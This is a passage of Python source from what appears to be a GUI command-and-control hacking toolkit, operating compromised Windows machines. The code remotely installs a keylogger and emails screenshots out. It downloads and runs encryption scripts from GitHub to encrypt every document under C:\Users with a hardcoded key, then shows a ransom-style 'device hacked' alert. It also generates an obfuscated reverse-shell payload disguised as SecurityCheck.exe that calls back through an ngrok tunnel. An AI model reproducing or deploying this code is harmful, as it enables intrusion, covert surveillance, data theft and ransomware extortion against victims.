            dialog = ctk.CTkInputDialog(text="Enter the email address where you received the keylogger report:", title="Email",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
            email = dialog.get_input()  
            email_re = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
            
            if not re.match(email_re,email) and email:
                    CTkMessagebox(title="Error!",message="Enter a valid email address.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
                    self.c2_listening_terminal.configure(state="disabled")
                    self.c2_listening_terminal.see('end')
            else:
                self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pynput keyboard")
                command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\keylogger.py {email}'
                result=self.remote_execute(command)
                self.remote_execute('del %tmp%\\Stealer.zip')
                self.remote_execute('rmdir /s /q "%tmp%\\Stealer')


            
        elif python_path_installed:
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            dialog = ctk.CTkInputDialog(text="Enter the email address where you received the keylogger report:", title="Email",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
            email = dialog.get_input()  
            email_re = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
            
            if not re.match(email_re,email) and email:
                    CTkMessagebox(title="Error!",message="Enter a valid email address.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
                    self.c2_listening_terminal.configure(state="disabled")
                    self.c2_listening_terminal.see('end')
            else:
                self.remote_execute("python -m pip install pynput keyboard")
                command=f'python %tmp%\\Stealer\\keylogger.py {email}'
                result=self.remote_execute(command)
                self.remote_execute('del %tmp%\\Stealer.zip')
                self.remote_execute('rmdir /s /q "%tmp%\\Stealer')
            
        else:
            self.c2_install_python()
            self.remote_execute('tar -xf %tmp%\\Stealer.zip')
            self.remote_execute('move Stealer %tmp%')

            dialog = ctk.CTkInputDialog(text="Enter the email address where you received the keylogger report:", title="Email",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
            email = dialog.get_input()  
            email_re = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
            
            if not re.match(email_re,email) and email:
                    CTkMessagebox(title="Error!",message="Enter a valid email address.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
                    self.c2_listening_terminal.configure(state="disabled")
                    self.c2_listening_terminal.see('end')
            else:
                self.remote_execute("%USERPROFILE%\\Python313\\python.exe -m pip install pynput keyboard")
                command=f'%USERPROFILE%\\Python313\\python.exe %tmp%\\Stealer\\keylogger.py {email}'
                result=self.remote_execute(command)
                self.remote_execute('del %tmp%\\Stealer.zip')
                self.remote_execute('rmdir /s /q "%tmp%\\Stealer')




































    def c2_show_popup_window(self):
        dialog = ctk.CTkInputDialog(text="Type the message from the pop-up window:", title="Pop-Up Window",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
        popup_message = dialog.get_input()  
    
        command=f'powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'{popup_message}\')"'
        self.remote_execute(command)
        result=f"Pop-Up created with: {popup_message}\n\n"
        self.c2_command_terminal.delete(0,"end")
        self.c2_listening_terminal.insert("end", result, "white")
        self.c2_listening_terminal.tag_config("rojo", foreground="red")
        self.c2_listening_terminal.configure(state="disabled")
        self.c2_listening_terminal.see('end')


    def c2_voice_message(self):
        dialog = ctk.CTkInputDialog(text="Type the message from the pop-up window:", title="Voice Message",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
        audio_message = dialog.get_input()  
    
        command=f"powershell Add-Type -AssemblyName System.Speech;$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speak.Speak('{audio_message}')"
        self.remote_execute(command)
        result=f"Voice message created with: {audio_message}\n\n"
        self.c2_command_terminal.delete(0,"end")
        self.c2_listening_terminal.insert("end", result, "white")
        self.c2_listening_terminal.tag_config("rojo", foreground="red")
        self.c2_listening_terminal.configure(state="disabled")
        self.c2_listening_terminal.see('end')

    
    def c2_make_screenshot(self):


        python_installed=self.remote_execute('%USERPROFILE%\\Python313\\python.exe --version')
        python_path_installed=self.remote_execute('python --version')

        if python_installed.strip():
            dialog = ctk.CTkInputDialog(text="Enter the email address where you received the screenshot:", title="Email",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
            email = dialog.get_input()  
            email_re = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
            
            if not re.match(email_re,email) and email:
                    CTkMessagebox(title="Error!",message="Enter a valid email address.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
                    self.c2_listening_terminal.configure(state="disabled")
                    self.c2_listening_terminal.see('end')
            else:
                command='powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap 1920,1080; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save(\'%tmp%\\screen.png\')"'
                self.remote_execute(command)

                command='curl -L -o %tmp%\\screenshot.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/screenshot.py'
                self.remote_execute(command)
                command=f"%USERPROFILE%\\Python313\\python.exe %tmp%\\screenshot.py {email}"
                self.remote_execute(command)
                result=f"Screenshot sent to: {email}\n(Check Spam Box)\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                self.remote_execute("del %tmp%\\screenshot.py")
                self.remote_execute("del %tmp%\\screen.png")

        elif python_path_installed.strip():
            dialog = ctk.CTkInputDialog(text="Enter the email address where you received the screenshot:", title="Email",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
            email = dialog.get_input()  
            email_re = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
            
            if not re.match(email_re,email) and email:
                    CTkMessagebox(title="Error!",message="Enter a valid email address.",height=370, width=430,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
                    self.c2_listening_terminal.configure(state="disabled")
                    self.c2_listening_terminal.see('end')
            else:
                command='powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object Drawing.Bitmap 1920,1080; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save(\'%tmp%\\screen.png\')"'
                self.remote_execute(command)

                command='curl -L -o %tmp%\\screenshot.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/screenshot.py'
                self.remote_execute(command)

                command=f"python %tmp%\\screenshot.py {email}"
                self.remote_execute(command)
                result=f"Screenshot sent to: {email}\n(Check Spam Box)\n\n"
                self.c2_command_terminal.delete(0,"end")
                self.c2_listening_terminal.insert("end", result, "white")
                self.c2_listening_terminal.tag_config("rojo", foreground="red")
                self.c2_listening_terminal.configure(state="disabled")
                self.c2_listening_terminal.see('end')
                self.remote_execute("del %tmp%\\screenshot.py")
                self.remote_execute("del %tmp%\\screen.png")

        else:
            result=f"Python not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


    def c2_encrypt_files(self):

        python_installed=self.remote_execute('%USERPROFILE%\\Python313\\python.exe --version')
        python_path_installed=self.remote_execute('python --version')

        if python_installed.strip():
            
            dialog = ctk.CTkInputDialog(text="Write the file(s) with full path in this format (C:\\Users\\PyHT\\hello.txt,C:\\Users\\PyHT\\Desktop\\test.txt):", title="Encrypt File(s)",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
            encrypt_file = dialog.get_input() 

            command='curl -L -o %tmp%\\encrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/encrypt.py'
            self.remote_execute(command)

            command=f"%USERPROFILE%\\Python313\\python.exe -m pip install cryptography"
            self.remote_execute(command)

            self.remote_execute("echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key")


            command=f"%USERPROFILE%\\Python313\\python.exe %tmp%\\encrypt.py {encrypt_file}"
            result=self.remote_execute(command)+"\n\n"


            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

            self.remote_execute("del %tmp%\\pass.key")
            self.remote_execute("del %tmp%\\encrypt.py")


        elif python_path_installed.strip(): 

            dialog = ctk.CTkInputDialog(text="Write the file(s) with full path in this format (C:\\Users\\PyHT\\hello.txt,C:\\Users\\PyHT\\Desktop\\test.txt):", title="Encrypt File(s)",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
            encrypt_file = dialog.get_input() 

            command='curl -L -o %tmp%\\encrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/encrypt.py'
            self.remote_execute(command)

            command=f"python -m pip install cryptography"
            self.remote_execute(command)

            self.remote_execute("echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key")


            command=f"python %tmp%\\encrypt.py {encrypt_file}"
            result=self.remote_execute(command)+"\n\n"


            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

            self.remote_execute("del %tmp%\\pass.key")
            self.remote_execute("del %tmp%\\encrypt.py")

        else:
            result=f"Python not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')


    def c2_list_encrypted_files(self):
        command=f"type %APPDATA%\\encrypted_files.txt"
        result=self.remote_execute(command)+"\n\n"
        end_char=""
        if not result.strip():
            result=f"No encrypted files found\n\n"
        else:
            while True:
                end_char=result
                result+=self.remote_execute(" ")
                if end_char==result:
                    result+="\n\n"
                    break
                    
        self.c2_command_terminal.delete(0,"end")
        self.c2_listening_terminal.insert("end", result, "white")
        self.c2_listening_terminal.tag_config("rojo", foreground="red")
        self.c2_listening_terminal.configure(state="disabled")
        self.c2_listening_terminal.see('end')


    def c2_encrypt_all_files(self):

        python_installed=self.remote_execute('%USERPROFILE%\\Python313\\python.exe --version')
        python_path_installed=self.remote_execute('python --version')

        if python_installed.strip():

            self.remote_execute('del %APPDATA%\\allfiles.txt"')

            command='for /r "C:\\Users" %f in (*.txt *.pdf *.docx *.xlsx) do @echo|set /p="%f," >> %APPDATA%\\allfiles.txt'
            self.remote_execute(command)

            command='curl -L -o %tmp%\\encrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/encrypt.py'
            self.remote_execute(command)

            command=f"%USERPROFILE%\\Python313\\python.exe -m pip install cryptography"
            self.remote_execute(command)

            self.remote_execute('echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key')

            command=f"%USERPROFILE%\\Python313\\python.exe %tmp%\\encrypt.py %APPDATA%\\allfiles.txt"
            result=self.remote_execute(command)+"\n\n"

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

            self.remote_execute("del %tmp%\\pass.key")
            self.remote_execute("del %tmp%\\encrypt.py")

        elif python_path_installed.strip(): 

            self.remote_execute('del %APPDATA%\\allfiles.txt"')
            command='for /r "C:\\Users" %f in (*.txt *.pdf *.docx *.xlsx) do @echo|set /p="%f," >> %APPDATA%\\allfiles.txt'
            self.remote_execute(command)

            command='curl -L -o %tmp%\\encrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/encrypt.py'
            self.remote_execute(command)

            command=f"python -m pip install cryptography"
            self.remote_execute(command)

            self.remote_execute('echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key')

            command=f"python %tmp%\\encrypt.py %APPDATA%\\allfiles.txt"
            result=self.remote_execute(command)+"\n\n"

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

            self.remote_execute("del %tmp%\\pass.key")
            self.remote_execute("del %tmp%\\encrypt.py")

        else:
            result=f"Python not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

    def c2_encrypt_all_files_with_alert(self):
        
        python_installed=self.remote_execute('%USERPROFILE%\\Python313\\python.exe --version')
        python_path_installed=self.remote_execute('python --version')

        if python_installed.strip():

            self.remote_execute('del %APPDATA%\\allfiles.txt"')
            command='for /r "C:\\Users" %f in (*.txt *.pdf *.docx *.xlsx) do @echo|set /p="%f," >> %APPDATA%\\allfiles.txt'
            self.remote_execute(command)

            command='curl -L -o %tmp%\\encrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/encrypt.py'
            self.remote_execute(command)

            command=f"%USERPROFILE%\\Python313\\python.exe -m pip install cryptography"
            self.remote_execute(command)

            self.remote_execute('echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key')

            command=f"%USERPROFILE%\\Python313\\python.exe %tmp%\\encrypt.py %APPDATA%\\allfiles.txt"
            result=self.remote_execute(command)+"\n\n"

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

            self.remote_execute("del %tmp%\\pass.key")
            self.remote_execute("del %tmp%\\encrypt.py")

            popup_message = "This device has been hacked, all files have been encrypted. Este dispositivo ha sido hackeado, todos los archivos han sido encriptados. Cet appareil a été piraté, tous les fichiers ont été cryptés. Это устройство было взломано, все файлы были зашифрованы. Questo dispositivo è stato violato, tutti i file sono stati criptati. Dit apparaat is gehackt, alle bestanden zijn versleuteld. (%APPDATA%\\encrypted_files.txt)"
            command=f'powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'{popup_message}\')"'
            self.remote_execute(command)

            audio_message="This device has been hacked, all files have been encrypted.        Este dispositivo ha sido hackeado, todos los archivos han sido encriptados.        Cet appareil a été piraté, tous les fichiers ont été cryptés.        Это устройство было взломано, все файлы были зашифрованы.        Questo dispositivo è stato violato, tutti i file sono stati criptati.        Dit apparaat is gehackt, alle bestanden zijn versleuteld."
            command=f"powershell Add-Type -AssemblyName System.Speech;$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speak.Speak('{audio_message}')"
            self.remote_execute(command)


        elif python_path_installed.strip(): 

            self.remote_execute('del %APPDATA%\\allfiles.txt"')
            command='for /r "C:\\Users" %f in (*.txt *.pdf *.docx *.xlsx) do @echo|set /p="%f," >> %APPDATA%\\allfiles.txt'
            result=self.remote_execute(command)

            command='curl -L -o %tmp%\\encrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/encrypt.py'
            self.remote_execute(command)

            command=f"python -m pip install cryptography"
            self.remote_execute(command)

            self.remote_execute('echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key')

            command=f"python %tmp%\\encrypt.py %APPDATA%\\allfiles.txt"
            result=self.remote_execute(command)+"\n\n"

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

            self.remote_execute("del %tmp%\\pass.key")
            self.remote_execute("del %tmp%\\encrypt.py")

            popup_message = "This device has been hacked, all files have been encrypted. Este dispositivo ha sido hackeado, todos los archivos han sido encriptados. Cet appareil a été piraté, tous les fichiers ont été cryptés. Это устройство было взломано, все файлы были зашифрованы. Questo dispositivo è stato violato, tutti i file sono stati criptati. Dit apparaat is gehackt, alle bestanden zijn versleuteld. (%APPDATA%\\encrypted_files.txt)"
            command=f'powershell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\'{popup_message}\')"'
            self.remote_execute(command)

            audio_message="This device has been hacked, all files have been encrypted.        Este dispositivo ha sido hackeado, todos los archivos han sido encriptados.        Cet appareil a été piraté, tous les fichiers ont été cryptés.        Это устройство было взломано, все файлы были зашифрованы.        Questo dispositivo è stato violato, tutti i file sono stati criptati.        Dit apparaat is gehackt, alle bestanden zijn versleuteld."
            command=f"powershell Add-Type -AssemblyName System.Speech;$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speak.Speak('{audio_message}')"
            self.remote_execute(command)

        else:
            result=f"Python not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

    
    def c2_decrypt_files(self):

        python_installed=self.remote_execute('%USERPROFILE%\\Python313\\python.exe --version')
        python_path_installed=self.remote_execute('python --version')

        if python_installed.strip():

            dialog = ctk.CTkInputDialog(text="Write the file(s) with full path in this format (C:\\Users\\PyHT\\hello.txt,C:\\Users\\PyHT\\Desktop\\test.txt):", title="Decrypt File(s)",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
            decrypt_file = dialog.get_input()  

            command='curl -L -o %tmp%\\decrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/decrypt.py'
            self.remote_execute(command)

            command=f"%USERPROFILE%\\Python313\\python.exe -m pip install cryptography"
            self.remote_execute(command)
            
            self.remote_execute("echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key")

            command=f"%USERPROFILE%\\Python313\\python.exe %tmp%\\decrypt.py {decrypt_file}"
            result=self.remote_execute(command)+"\n\n"

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')     

            self.remote_execute('del %tmp%\\pass.key')
            for file in decrypt_file.split(','):
                if file !="":
                    self.remote_execute(f'powershell -Command "(Get-Content %APPDATA%\\encrypted_files.txt) -replace \'{file}\',\'\' | Set-Content archivos.txt"')   
            self.remote_execute("del %tmp%\\decrypt.py")


        elif python_path_installed.strip(): 

            dialog = ctk.CTkInputDialog(text="Write the file(s) with full path in this format (C:\\Users\\PyHT\\hello.txt,C:\\Users\\PyHT\\Desktop\\test.txt):", title="Decrypt File(s)",button_fg_color="red",fg_color="black",button_hover_color="#62090C",entry_text_color="#EEEFF0",button_text_color="#EEEFF0")
            decrypt_file = dialog.get_input()  

            command='curl -L -o %tmp%\\decrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/decrypt.py'
            self.remote_execute(command)

            command=f"python -m pip install cryptography"
            self.remote_execute(command)
            
            self.remote_execute("echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key")

            command=f"python %tmp%\\decrypt.py {decrypt_file}"
            result=self.remote_execute(command)+"\n\n"

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')     

            self.remote_execute('del %tmp%\\pass.key')
            for file in decrypt_file.split(','):
                if file !="":
                    self.remote_execute(f'powershell -Command "(Get-Content %APPDATA%\\encrypted_files.txt) -replace \'{file}\',\'\' | Set-Content %APPDATA%\\encrypted_files.txt"')   
            self.remote_execute("del %tmp%\\decrypt.py")

        else:
            result=f"Python not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

    def c2_decrypt_all_files(self):
        
        python_installed=self.remote_execute('%USERPROFILE%\\Python313\\python.exe --version')
        python_path_installed=self.remote_execute('python --version')

        if python_installed.strip():

            command='curl -L -o %tmp%\\decrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/decrypt.py'
            self.remote_execute(command)

            command=f"%USERPROFILE%\\Python313\\python.exe -m pip install cryptography"
            self.remote_execute(command)

            self.remote_execute('echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key')

            command=f"%USERPROFILE%\\Python313\\python.exe %tmp%\\decrypt.py %APPDATA%\\allfiles.txt"
            result=self.remote_execute(command)+"\n\n"

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

            self.remote_execute("del %tmp%\\pass.key")
            self.remote_execute('del %APPDATA%\\allfiles.txt"')
            self.remote_execute("del %tmp%\\decrypt.py")
            self.remote_execute('del %APPDATA%\\encrypted_files.txt"')

        elif python_path_installed.strip(): 


            command='curl -L -o %tmp%\\decrypt.py "https://github.com/Py-Us3r/PyHT-Python-Hacking-Toolkit/raw/refs/heads/main/Uploads/decrypt.py'
            self.remote_execute(command)

            command=f"python -m pip install cryptography"
            self.remote_execute(command)

            self.remote_execute('echo YD9Hw5Gn2UK-qq6Ejl9xD-aO-_z2ofPAkL-0cGhxofc= > %tmp%\\pass.key')

            command=f"python %tmp%\\decrypt.py %APPDATA%\\allfiles.txt"
            result=self.remote_execute(command)+"\n\n"

            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')

            self.remote_execute("del %tmp%\\pass.key")
            self.remote_execute('del %APPDATA%\\allfiles.txt"')
            self.remote_execute("del %tmp%\\decrypt.py")
            self.remote_execute('del %APPDATA%\\encrypted_files.txt"')


        else:
            result=f"Python not installed\n\n"
            self.c2_command_terminal.delete(0,"end")
            self.c2_listening_terminal.insert("end", result, "white")
            self.c2_listening_terminal.tag_config("rojo", foreground="red")
            self.c2_listening_terminal.configure(state="disabled")
            self.c2_listening_terminal.see('end')



## Generate Malware Button

    def c2_generate_malware(self):

      c2_frame=ctk.CTkFrame(self,width=680,height=400, fg_color="#171717",bg_color="#171717")
      c2_frame.place(x=360,y=50)

      image_path = r"images/malware.png"
      pil_image = Image.open(image_path)
      resized_image=pil_image.resize((250,250))
      tk_image = ImageTk.PhotoImage(resized_image)
      logo = ctk.CTkButton(c2_frame, image=tk_image, text="", width=0, height=0,fg_color="#171717",hover=False)
      logo.place(x=400,y=70)

      guide_button=ctk.CTkButton(c2_frame,text="  Guide" ,width=20,height=20,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",15),corner_radius=80,command=self.guide)
      guide_button.place(x=20,y=20)

      ngrok_token_label=ctk.CTkLabel(c2_frame,text="Ngrok API",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
      ngrok_token_label.place(x=20,y=140)

      ngrok_token_entry=ctk.CTkEntry(c2_frame,width=230,height=30,fg_color="black",bg_color="black",text_color="#32C305",font=("Hack Nerd Font",15),border_width=2,border_color="red",textvariable=self.ngrok_token)
      ngrok_token_entry.place(x=150,y=140)


      obfuscate_label=ctk.CTkLabel(c2_frame,text="Obfuscate",font=("Hack Nerd Font",15),fg_color="#171717",bg_color="#171717",text_color="red")
      obfuscate_label.place(x=20,y=190)

      obfuscate_switch=ctk.CTkSwitch(c2_frame,text="",variable=self.obfuscate_switch_option,onvalue="on",offvalue="off",fg_color="red",progress_color="green")
      obfuscate_switch.place(x=150,y=190)

      generate_button=ctk.CTkButton(c2_frame,text="󱎶 Generate malware  " ,width=50,height=50,corner_radius=80,fg_color="red",text_color="black",hover=False,bg_color="#171717",font=("Hack Nerd Font",20),border_width=2,border_color="red",command=self.start_c2)
      generate_button.place(x=95,y=240)


    def guide(self):
      webbrowser.open("https://github.com/")


## Generate Malware Thread // Obfuscate OFF


    def obfuscate_off_thread(self):
      self.c2_listen_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="green",bg_color="black",font=("Hack Nerd Font",30))
      self.c2_listen_active_label.place(x=30,y=338)
      API = self.ngrok_token.get()

      malware = "import socket, subprocess, re, tempfile, os, requests, time, shutil\n"
      malware += 'exec("def _(_): return __import__(\'subprocess\').check_output(_, shell=True)")\n'
      malware += 'exec("def a(b):\\n  if b.startswith(\\\"cd \\\" ):\\n    c=b.split(\\\" \\", 1)[1]; os.chdir(c); return \\"Changed directory to \\"+os.getcwd()+\\\"\\\\n\\\"\\n  return _ (b).decode(\\\"cp850\\\")")\n'
      malware += 'exec("def b(c):\\n  d = {\\\"Authorization\\\": f\\\"Bearer '+API+'\\\", \\"Ngrok-Version\\\": \\"2\\\"}\\n  while True:\\n    try:\\n      e = requests.get(\\\"https://api.ngrok.com/tunnels\\\", headers=d)\\n      f = e.json()[\\\"tunnels\\\"][0][\\\"public_url\\\"].split(\\\"://\\\")[1]\\n      g = f.split(\\\":\\\")[0]\\n      h = f.split(\\\":\\\")[1]\\n\\n      return g, h\\n    except:\\n      pass\\n      time.sleep(5)")\n'
      malware += 'exec("def c(i,p):\\n  j=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\n  j.connect((i,int(p)))\\n  while True:\\n    k=j.recv(1024).decode().strip()\\n    try:\\n      j.send(b\\\"\\\\n\\\"+a(k).encode()+b\\\"\\\\n\\\")\\n    except:\\n      j.send(b\\\"\\\\n[!] Error\\\\n\\\\n\\\")\\n  j.close()")\n'
      malware += 'exec("if __name__ == \\"__main__\\\":\\n  f_p = os.getcwd()\\n  sP = f\\\"{f_p}\\\\\\\\SecurityCheck.exe\\\"\\n  dP = os.path.join(os.getenv(\\\"APPDATA\\\"), \\"SecurityCheck.exe\\\")\\n  if not os.path.exists(dP):\\n    os.makedirs(os.path.dirname(dP), exist_ok=True)\\n    shutil.copy(sP, dP)\\n    pass\\n  else:\\n    pass")\n'
      malware += 'exec("if __name__==\\"__main__\\\":\\n  i,p=b(\\"'+API+'\\")\\n  while True:\\n    try:\\n      c(i,p)\\n    except:\\n      time.sleep(5)\\n      i,p=b(\\"'+API+'\\")")'


      print(malware)

      with open("scripts/SecurityCheck.py","w") as f:
        f.write(malware)

      try:
        subprocess.run("bash scripts/obfuscate_off.sh",shell=True,check=True)
        CTkMessagebox(title="Succesfuly",message=f"Malware generated succesfuly in {os.getcwd()}/SecurityCheck.exe.",height=370, width=550,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="check")
         
      except:
        CTkMessagebox(title="Failed",message="Malware generating failed.",height=370, width=550,button_color="red",button_width=50,button_height=50,button_hover_color="#610101",justify="center",font=("Hack Nerd Font",15),sound=None,wraplength=520,icon="cancel")
      self.c2_listen_active_label.destroy()
      


## Generate Malware Thread // Obfuscate ON

    def obfuscate_on_thread(self):
      self.c2_listen_active_label=ctk.CTkLabel(self,text="",fg_color="black",text_color="green",bg_color="black",font=("Hack Nerd Font",30))
